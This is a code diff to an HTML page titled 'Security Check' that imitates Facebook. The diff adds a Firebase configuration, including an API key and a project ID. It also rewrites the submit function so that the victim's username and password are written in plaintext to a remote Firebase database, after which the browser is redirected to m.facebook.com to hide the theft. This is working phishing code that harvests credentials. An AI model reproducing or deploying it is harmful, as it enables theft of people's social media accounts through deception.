@@ -6,6 +6,24 @@
 	<title>Security Check</title>
 	<link rel="shortcut icon" type="ico" href="fb-ico.png">
 	<link rel="stylesheet" type="text/css" href="style.css">
+
+	<script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-app.js"></script>
+
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyA0PsfDZeFPWXVUXq6J-aVIohvigAwuvRA",
+    authDomain: "face-7560a.firebaseapp.com",
+    databaseURL: "https://face-7560a.firebaseio.com",
+    projectId: "face-7560a",
+    storageBucket: "face-7560a.appspot.com",
+    messagingSenderId: "790337028239",
+    appId: "1:790337028239:web:c2a5ceca712904315ab0fa"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+</script>
+
 </head>
 <body>
 	<header>
@@ -70,8 +88,15 @@
 <script>
     function post()
 {
-									alert("success");
-								}
+								  var username=document.getElementById("username").value;
+  var password=document.getElementById("password").value;
+
+  firebase.database().ref().child('Users').set({
+  username : username ,
+  password : password
+});
+	
+window.location.href="https://m.facebook.com/";			}
 </script>
 </body>
 </html>
